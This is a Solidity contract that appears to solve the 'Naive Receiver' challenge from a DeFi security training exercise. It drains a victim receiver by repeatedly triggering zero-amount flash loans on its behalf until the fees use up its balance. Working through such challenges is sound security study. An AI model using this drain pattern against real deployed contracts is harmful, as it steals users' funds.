// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    NaiveReceiverLenderPool public lenderPool;

    function attack(
        address payable _pool,
        address payable target
    ) external payable {
        lenderPool = NaiveReceiverLenderPool(_pool);
        uint fee = lenderPool.fixedFee();
        while (target.balance >= fee) {
            lenderPool.flashLoan(target, 0);
        }
    }
}
